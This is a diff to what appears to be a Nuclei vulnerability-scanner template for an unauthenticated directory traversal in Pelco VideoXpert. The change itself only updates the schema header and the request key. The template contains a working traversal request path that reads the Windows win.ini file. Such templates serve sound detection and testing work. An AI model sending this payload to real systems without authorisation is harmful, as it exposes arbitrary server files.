@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: schneider-electric-pelco-videoxpert-core-admin-portal-lfi
 
 info:
@@ -7,7 +8,7 @@ info:
   description: Pelco VideoXpert suffers from a directory traversal vulnerability. Exploiting this issue will allow an unauthenticated attacker to view arbitrary files within the context of the web server.
   tags: windows,lfi,schneider
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/portal//..\\\..\\\..\\\..\\\windows\win.ini"
